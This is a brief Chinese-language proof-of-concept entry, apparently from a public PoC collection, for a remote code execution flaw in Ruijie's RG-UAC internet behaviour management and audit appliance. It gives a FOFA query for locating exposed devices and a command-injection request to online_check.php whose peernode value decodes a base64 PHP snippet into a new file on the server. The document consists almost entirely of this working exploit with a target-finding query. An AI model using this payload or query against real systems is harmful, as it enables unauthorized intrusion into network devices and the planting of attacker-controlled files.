## RG-UAC锐捷统一上网行为管理与审计系统存在远程代码执行漏洞

## fofa
```
app="Ruijie-RG-UAC"
```


## poc
```
/view/vpn/autovpn/online_check.php?peernode= | `echo PD9waHAgcGhwaW5mbygpOw== | base64 -d > 1.php`

```

![image](https://github.com/wy876/POC/assets/139549762/a10f13fb-884b-4c74-b912-f08936bb25ff)
